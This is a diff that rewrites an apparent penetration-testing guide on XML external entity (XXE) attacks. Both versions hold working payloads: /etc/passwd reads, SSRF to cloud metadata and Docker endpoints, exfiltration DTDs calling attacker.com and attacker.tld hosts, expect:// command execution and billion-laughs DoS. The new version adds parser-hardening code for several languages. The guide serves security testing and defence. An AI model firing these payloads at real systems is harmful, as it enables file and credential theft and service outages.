@@ -1,276 +1,224 @@
 <xxe_vulnerability_guide>
-<title>XML EXTERNAL ENTITY (XXE) - ADVANCED EXPLOITATION</title>
+<title>XML EXTERNAL ENTITY (XXE)</title>
 
-<critical>XXE leads to file disclosure, SSRF, RCE, and DoS. Often found in APIs, file uploads, and document parsers.</critical>
+<critical>XXE is a parser-level failure that enables local file reads, SSRF to internal control planes, denial-of-service via entity expansion, and in some stacks, code execution through XInclude/XSLT or language-specific wrappers. Treat every XML input as untrusted until the parser is proven hardened.</critical>
 
-<discovery_points>
-- XML file uploads (docx, xlsx, svg, xml)
-- SOAP endpoints
-- REST APIs accepting XML
-- SAML implementations
-- RSS/Atom feeds
-- XML configuration files
-- WebDAV
-- Office document processors
-- SVG image uploads
-- PDF generators with XML input
-</discovery_points>
+<scope>
+- File disclosure: read server files and configuration
+- SSRF: reach metadata services, internal admin panels, service ports
+- DoS: entity expansion (billion laughs), external resource amplification
+- Injection surfaces: REST/SOAP/SAML/XML-RPC, file uploads (SVG, Office), PDF generators, build/report pipelines, config importers
+- Transclusion: XInclude and XSLT document() loading external resources
+</scope>
 
-<basic_payloads>
-<file_disclosure>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<root>&xxe;</root>
+<methodology>
+1. Inventory all XML consumers: endpoints, upload parsers, background jobs, CLI tools, converters, and third-party SDKs.
+2. Start with capability probes: does the parser accept DOCTYPE? resolve external entities? allow network access? support XInclude/XSLT?
+3. Establish a quiet oracle (error shape, length/ETag diffs, OAST callbacks), then escalate to targeted file/SSRF payloads.
+4. Validate per-channel parity: the same parser options must hold across REST, SOAP, SAML, file uploads, and background jobs.
+</methodology>
 
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
-<root>&xxe;</root>
-</file_disclosure>
+<discovery_techniques>
+<surface_map>
+- File uploads: SVG/MathML, Office (docx/xlsx/ods/odt), XML-based archives, Android/iOS plist, project config imports
+- Protocols: SOAP/XML-RPC/WebDAV/SAML (ACS endpoints), RSS/Atom feeds, server-side renderers and converters
+- Hidden paths: "xml", "upload", "import", "transform", "xslt", "xsl", "xinclude" parameters; processing-instruction headers
+</surface_map>
 
-<ssrf_via_xxe>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
-<root>&xxe;</root>
-</ssrf_via_xxe>
+<capability_probes>
+- Minimal DOCTYPE: attempt a harmless internal entity to detect acceptance without causing side effects
+- External fetch test: point to an OAST URL to confirm egress; prefer DNS first, then HTTP
+- XInclude probe: add xi:include to see if transclusion is enabled
+- XSLT probe: xml-stylesheet PI or transform endpoints that accept stylesheets
+</capability_probes>
+</discovery_techniques>
 
-<blind_xxe_oob>
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
+<detection_channels>
+<direct>
+- Inline disclosure of entity content in the HTTP response, transformed output, or error pages
+</direct>
+
+<error_based>
+- Coerce parser errors that leak path fragments or file content via interpolated messages
+</error_based>
+
+<oast>
+- Blind XXE via parameter entities and external DTDs; confirm with DNS/HTTP callbacks
+- Encode data into request paths/parameters to exfiltrate small secrets (hostnames, tokens)
+</oast>
+
+<timing>
+- Fetch slow or unroutable resources to produce measurable latency differences (connect vs read timeouts)
+</timing>
+</detection_channels>
+
+<core_payloads>
+<local_file>
+<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<r>&xxe;</r>
+
+<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+<r>&xxe;</r>
+</local_file>
+
+<ssrf>
+<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://127.0.0.1:2375/version">]>
+<r>&xxe;</r>
+
+<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI">]>
+<r>&xxe;</r>
+</ssrf>
+
+<oob_parameter_entity>
+<!DOCTYPE x [<!ENTITY % dtd SYSTEM "http://attacker.tld/evil.dtd"> %dtd;]>
 
 evil.dtd:
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
-%eval;
-%exfiltrate;
-</blind_xxe_oob>
-</basic_payloads>
+<!ENTITY % f SYSTEM "file:///etc/hostname">
+<!ENTITY % e "<!ENTITY &#x25; exfil SYSTEM 'http://%f;.attacker.tld/'>">
+%e; %exfil;
+</oob_parameter_entity>
+</core_payloads>
 
 <advanced_techniques>
 <parameter_entities>
-<!DOCTYPE foo [
-  <!ENTITY % data SYSTEM "file:///etc/passwd">
-  <!ENTITY % param "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?d=%data;'>">
-  %param;
-  %exfil;
-]>
+- Use parameter entities in the DTD subset to define secondary entities that exfiltrate content; works even when general entities are sanitized in the XML tree
 </parameter_entities>
 
-<error_based_xxe>
-<!DOCTYPE foo [
-  <!ENTITY % file SYSTEM "file:///etc/passwd">
-  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
-  %eval;
-  %error;
-]>
-</error_based_xxe>
-
-<xxe_in_attributes>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<root attr="&xxe;"/>
-</xxe_in_attributes>
-</advanced_techniques>
-
-<filter_bypasses>
-<encoding_tricks>
-- UTF-16: <?xml version="1.0" encoding="UTF-16"?>
-- UTF-7: <?xml version="1.0" encoding="UTF-7"?>
-- Base64 in CDATA: <![CDATA[base64_payload]]>
-</encoding_tricks>
-
-<protocol_variations>
-- file:// → file:
-- file:// → netdoc://
-- http:// → https://
-- Gopher: gopher://
-- PHP wrappers: php://filter/convert.base64-encode/resource=/etc/passwd
-</protocol_variations>
-
-<doctype_variations>
-<!doctype foo [
-<!DoCtYpE foo [
-<!DOCTYPE foo PUBLIC "Any" "http://evil.com/evil.dtd">
-<!DOCTYPE foo SYSTEM "http://evil.com/evil.dtd">
-</doctype_variations>
-</filter_bypasses>
-
-<specific_contexts>
-<json_xxe>
-{% raw %}{"name": "test", "content": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><x>&xxe;</x>"}{% endraw %}
-</json_xxe>
-
-<soap_xxe>
-<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
-  <soap:Body>
-    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-    <foo>&xxe;</foo>
-  </soap:Body>
-</soap:Envelope>
-</soap_xxe>
-
-<svg_xxe>
-<svg xmlns="http://www.w3.org/2000/svg">
-  <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-  <text>&xxe;</text>
-</svg>
-</svg_xxe>
-
-<docx_xlsx_xxe>
-1. Unzip document
-2. Edit document.xml or similar
-3. Add XXE payload
-4. Rezip and upload
-</docx_xlsx_xxe>
-</specific_contexts>
-
-<blind_xxe_techniques>
-<dns_exfiltration>
-<!DOCTYPE foo [
-  <!ENTITY % data SYSTEM "file:///etc/hostname">
-  <!ENTITY % param "<!ENTITY &#x25; exfil SYSTEM 'http://%data;.attacker.com/'>">
-  %param;
-  %exfil;
-]>
-</dns_exfiltration>
-
-<ftp_exfiltration>
-<!DOCTYPE foo [
-  <!ENTITY % data SYSTEM "file:///etc/passwd">
-  <!ENTITY % param "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.com:2121/%data;'>">
-  %param;
-  %exfil;
-]>
-</ftp_exfiltration>
-
-<php_wrappers>
-<!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-]>
-<root>&xxe;</root>
-</php_wrappers>
-</blind_xxe_techniques>
-
-<xxe_to_rce>
-<expect_module>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
-<root>&xxe;</root>
-</expect_module>
-
-<file_upload_lfi>
-1. Upload malicious PHP via XXE
-2. Include via LFI or direct access
-</file_upload_lfi>
-
-<java_specific>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:file:///tmp/evil.jar!/evil.class">]>
-</java_specific>
-</xxe_to_rce>
-
-<denial_of_service>
-<billion_laughs>
-<!DOCTYPE lolz [
-  <!ENTITY lol "lol">
-  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
-  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;">
-  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;">
-  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;">
-]>
-<lolz>&lol5;</lolz>
-</billion_laughs>
-
-<external_dtd_dos>
-<!DOCTYPE foo SYSTEM "http://slow-server.com/huge.dtd">
-</external_dtd_dos>
-</denial_of_service>
-
-<modern_bypasses>
 <xinclude>
 <root xmlns:xi="http://www.w3.org/2001/XInclude">
   <xi:include parse="text" href="file:///etc/passwd"/>
 </root>
+- Effective where entity resolution is blocked but XInclude remains enabled in the pipeline
 </xinclude>
 
-<xslt>
+<xslt_document>
+- XSLT processors can fetch external resources via document():
 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
   <xsl:template match="/">
     <xsl:copy-of select="document('file:///etc/passwd')"/>
   </xsl:template>
 </xsl:stylesheet>
-</xslt>
-</modern_bypasses>
+- Targets: transform endpoints, reporting engines (XSLT/Jasper/FOP), xml-stylesheet PI consumers
+</xslt_document>
 
-<parser_specific>
+<protocol_wrappers>
+- Java: jar:, netdoc:
+- PHP: php://filter, expect:// (when module enabled)
+- Gopher: craft raw requests to Redis/FCGI when client allows non-HTTP schemes
+</protocol_wrappers>
+</advanced_techniques>
+
+<filter_bypasses>
+<encoding_variants>
+- UTF-16/UTF-7 declarations, mixed newlines, CDATA and comments to evade naive filters
+</encoding_variants>
+
+<doctype_variants>
+- PUBLIC vs SYSTEM, mixed case <!DoCtYpE>, internal vs external subsets, multi-DOCTYPE edge handling
+</doctype_variants>
+
+<network_controls>
+- If network blocked but filesystem readable, pivot to local file disclosure; if files blocked but network open, pivot to SSRF/OAST
+</network_controls>
+</filter_bypasses>
+
+<special_contexts>
+<soap>
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <!DOCTYPE d [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+    <d>&xxe;</d>
+  </soap:Body>
+</soap:Envelope>
+</soap>
+
+<saml>
+- Assertions are XML-signed, but upstream XML parsers prior to signature verification may still process entities/XInclude; test ACS endpoints with minimal probes
+</saml>
+
+<svg_and_renderers>
+- Inline SVG and server-side SVG→PNG/PDF renderers process XML; attempt local file reads via entities/XInclude
+</svg_and_renderers>
+
+<office_docs>
+- OOXML (docx/xlsx/pptx) are ZIPs containing XML; insert payloads into document.xml, rels, or drawing XML and repackage
+</office_docs>
+</special_contexts>
+
+<parser_hardening>
 <java>
-- Supports jar: protocol
-- External DTDs by default
-- Parameter entities work
+```java
+DocumentBuilderFactory f = DocumentBuilderFactory.newInstance();
+f.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+f.setFeature("http://xml.org/sax/features/external-general-entities", false);
+f.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
+f.setFeature("http://javax.xml.XMLConstants/feature/secure-processing", true);
+f.setAttribute("http://javax.xml.XMLConstants/property/accessExternalDTD", "");
+f.setAttribute("http://javax.xml.XMLConstants/property/accessExternalSchema", "");
+```
 </java>
 
 <dotnet>
-- Supports file:// by default
-- DTD processing varies by version
+```csharp
+var settings = new XmlReaderSettings {
+  DtdProcessing = DtdProcessing.Prohibit,
+  XmlResolver = null
+};
+```
 </dotnet>
 
-<php>
-- libxml2 based
-- expect:// protocol with expect module
-- php:// wrappers
-</php>
-
 <python>
-- Default parsers often vulnerable
-- lxml safer than xml.etree
+```python
+from lxml import etree
+parser = etree.XMLParser(resolve_entities=False, no_network=True)
+etree.fromstring(xml_bytes, parser)
+# Prefer defusedxml for stdlib parsers
+```
 </python>
-</parser_specific>
 
-<validation_testing>
-<detection>
-1. Basic entity test: &xxe;
-2. External DTD: http://attacker.com/test.dtd
-3. Parameter entity: %xxe;
-4. Time-based: DTD with slow server
-5. DNS lookup: http://test.attacker.com/
-</detection>
+<php>
+```php
+$dom = new DOMDocument();
+// Do NOT use LIBXML_NOENT; forbid network
+$dom->loadXML($xml, LIBXML_NONET | LIBXML_NOERROR | LIBXML_NOWARNING);
+```
+</php>
+</parser_hardening>
+
+<validation>
+1. Provide a minimal payload proving parser capability (DOCTYPE/XInclude/XSLT).
+2. Demonstrate controlled access (file path or internal URL) with reproducible evidence.
+3. Confirm blind channels with OAST and correlate to the triggering request.
+4. Show cross-channel consistency (e.g., same behavior in upload and SOAP paths).
+5. Bound impact: exact files/data reached or internal targets proven.
+</validation>
 
 <false_positives>
-- Entity declared but not processed
-- DTD loaded but entities blocked
-- Output encoding preventing exploitation
-- Limited file access (chroot/sandbox)
+- DOCTYPE accepted but entities not resolved and no transclusion reachable
+- Filters or sandboxes that emit entity strings literally (no IO performed)
+- Mocks/stubs that simulate success without network/file access
+- XML processed only client-side (no server parse)
 </false_positives>
-</validation_testing>
 
-<impact_demonstration>
-1. Read sensitive files (/etc/passwd, web.config)
-2. Cloud metadata access (AWS keys)
-3. Internal network scanning (SSRF)
-4. Data exfiltration proof
-5. DoS demonstration
-6. RCE if possible
-</impact_demonstration>
-
-<automation>
-# XXE Scanner
-def test_xxe(url, param):
-    payloads = [
-        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
-        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/"> %xxe;]><foo/>',
-        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
-    ]
-
-    for payload in payloads:
-        response = requests.post(url, data={param: payload})
-        if 'root:' in response.text or check_callback():
-            return f"XXE found with: {payload}"
-</automation>
+<impact>
+- Disclosure of credentials/keys/configs, code, and environment secrets
+- Access to cloud metadata/token services and internal admin panels
+- Denial of service via entity expansion or slow external resources
+- Code execution via XSLT/expect:// in insecure stacks
+</impact>
 
 <pro_tips>
-1. Try all protocols, not just file://
-2. Use parameter entities for blind XXE
-3. Chain with SSRF for cloud metadata
-4. Test different encodings (UTF-16)
-5. Don't forget JSON/SOAP contexts
-6. XInclude when entities are blocked
-7. Error messages reveal file paths
-8. Monitor DNS for blind confirmation
-9. Some parsers allow network access but not files
-10. Modern frameworks disable XXE by default - check configs
+1. Prefer OAST first; it is the quietest confirmation in production-like paths.
+2. When content is sanitized, use error-based and length/ETag diffs.
+3. Probe XInclude/XSLT; they often remain enabled after entity resolution is disabled.
+4. Aim SSRF at internal well-known ports (kubelet, Docker, Redis, metadata) before public hosts.
+5. In uploads, repackage OOXML/SVG rather than standalone XML; many apps parse these implicitly.
+6. Keep payloads minimal; avoid noisy billion-laughs unless specifically testing DoS.
+7. Test background processors separately; they often use different parser settings.
+8. Validate parser options in code/config; do not rely on WAFs to block DOCTYPE.
+9. Combine with path traversal and deserialization where XML touches downstream systems.
+10. Document exact parser behavior per stack; defenses must match real libraries and flags.
 </pro_tips>
 
-<remember>XXE is about understanding parser behavior. Different parsers have different features and restrictions. Always test comprehensively and demonstrate maximum impact.</remember>
+<remember>XXE is eliminated by hardening parsers: forbid DOCTYPE, disable external entity resolution, and disable network access for XML processors and transformers across every code path.</remember>
 </xxe_vulnerability_guide>
